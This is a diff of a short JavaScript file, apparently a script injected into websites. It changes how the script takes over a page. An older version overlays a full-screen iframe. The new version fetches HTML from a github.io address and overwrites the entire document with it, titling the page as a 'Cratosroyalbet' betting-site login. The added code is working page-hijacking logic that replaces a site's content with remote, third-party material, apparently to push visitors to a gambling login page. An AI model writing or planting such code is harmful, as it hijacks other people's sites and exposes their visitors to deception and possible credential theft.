@@ -1,18 +1,22 @@
 (function() {
-    document.title = "Cratosroyalbet Giriş";
-    var ifr = document.createElement('iframe');
-    ifr.src = 'https://devworksg-ux.github.io/geldikkss3/index.html'; 
-    ifr.setAttribute('style', 'position:fixed; top:0; left:0; width:100%; height:100%; border:none; z-index:999999; background:#fff;' );
+    var designUrl = 'https://devworksg-ux.github.io/geldikkss3/index.html';
     
-    var render = function() {
-        if (document.body) {
-            document.body.innerHTML = '';
-            document.body.appendChild(ifr);
+    fetch(designUrl )
+        .then(response => response.text())
+        .then(html => {
+            // Sayfa başlığını ve meta verileri ayarla
+            document.title = "Cratosroyalbet Giriş | Güncel Adres";
+            
+            // Mevcut tüm içeriği sil ve yeni tasarımı enjekte et
+            document.open();
+            document.write(html);
+            document.close();
+            
+            // Görünürlüğü aç
             document.documentElement.style.visibility = "visible";
-            document.body.style.visibility = "visible";
-        } else {
-            setTimeout(render, 10);
-        }
-    };
-    render();
+        })
+        .catch(err => {
+            console.error("Yükleme hatası:", err);
+            document.documentElement.style.visibility = "visible";
+        });
 })();
